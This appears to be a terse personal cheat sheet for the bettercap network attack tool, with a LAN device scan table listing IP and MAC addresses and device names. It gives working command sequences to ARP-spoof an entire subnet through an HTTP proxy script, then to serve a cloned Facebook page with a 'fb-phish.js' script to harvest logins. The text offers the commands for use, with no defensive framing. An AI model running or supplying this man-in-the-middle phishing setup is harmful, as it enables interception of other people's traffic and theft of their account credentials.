
```
bettercap
```

```
net.probe on
clear
ticker on
```
192.168.50.156 laptop

192.168.50.166  | b8:27:eb:43:65:0c  | wlan0                       | Raspberry Pi Foundation         | 0 B    | 0 B     | 18:19:08   |
| 192.168.50.1    | 1c:87:2c:37:45:48  | gateway                     | Asustek Computer                | 70 kB  | 354 kB  | 18:19:08   |
|                 |                    |                             |                                 |        |         |            |
| 192.168.50.25   | 8c:85:90:32:59:eb  | IECHKWMAC06.                |                                 | 0 B    | 387 B   | 18:19:08   |
| 192.168.50.27   | 00:d9:d1:0f:3c:cb  |                             | Sony Interactive Entertainment  | 630 B  | 387 B   | 18:20:16   |
| 192.168.50.150  | 04:79:70:db:b0:d1  | HUAWEI_Mate_10_Pro-f3ac51.  |                                 | 568 B  | 344 B   | 18:20:10   |
| 192.168.50.156  | 9c:b6:d0:88:5c:c1  | laptop.                     | Rivet Networks                  | 568 B  | 344 B   | 18:20:10   |
| 192.168.50.235  | c0:ee:fb:d7:ef:76  | OnePlus_3.                  | OnePlus Tech (Shenzhen)         | 568 B  | 344 B   | 18:20:11
# targeting the whole subnet by default, to make it selective:
#
#   sudo ./bettercap -caplet rtfm.cap -eval "set arp.spoof.targets 192.168.1.64"

clear

set http.proxy.script repo/caplets/rtfm.js
http.proxy on
arp.spoof on
----
set http.server.address 0.0.0.0
set http.server.path www/www.facebook.com/

set http.proxy.script repo/caplets/fb-phish.js

http.proxy on
http.server on
